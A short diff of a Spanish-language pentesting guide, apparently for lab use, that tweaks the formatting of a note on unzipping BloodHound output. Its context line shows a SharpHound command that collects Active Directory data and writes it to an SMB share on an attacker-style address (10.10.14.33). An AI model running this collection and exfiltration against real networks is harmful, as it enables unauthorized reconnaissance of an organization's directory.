@@ -106,5 +106,6 @@ Podríamos entonces levantar un smb y enviar el resultado de bloodhound al mismo
 
         SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword <pass> --outputprefix <pref> --randomfilenames
 
-**<u> Atención: </u> **
+**<u>Atención:</u> **
+
 Si el archivo que guardamos tiene password vamos a tener que descomprimirlo y luego enviar los archivos resultantes a bloodhound. Si no tiene password, indiferentemente de la extención del mismo, podemos sumarlo a bloodhound.
